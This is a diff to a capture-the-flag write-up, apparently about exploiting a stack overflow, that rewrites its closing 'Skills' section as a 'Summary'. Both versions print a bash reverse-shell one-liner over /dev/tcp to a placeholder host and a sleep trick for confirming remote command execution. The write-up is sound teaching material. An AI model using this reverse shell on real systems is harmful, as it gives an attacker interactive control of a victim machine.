@@ -174,9 +174,11 @@ if __name__ == "__main__":
     exploit(r)
 ```
 
-# Skills
+# Summary
 
-I learned some useful skills from my teammates:
+It’s an interesting challenge and it’s really “real”. That’s what we would meet in the real life. We may learn lots of heap vulnerability exploiting skills in CTF but in daily work, exploiting through Stack Overflow is a more common situation!
 
-1. Use sleep xxx; to judge if the remote server is running our command.
-2. System function behave different as the shell. `bash -c 'exec bash -i &>/dev/tcp/<>ip address/<port> <&1';` could work well. Before attack remotely, we could test the command locally first `system(<cmd>)` .
+I learned some useful skills from my teammates during the contest:
+
+- Use `sleep xxx;` to judge if the remote server is running our command.
+- `system` in `C` behave differently from the shell. `bash -c 'exec bash -i &>/dev/tcp/<ip address>/<port> <&1';` could work well. Before attacking remotely, we could test the command locally first.
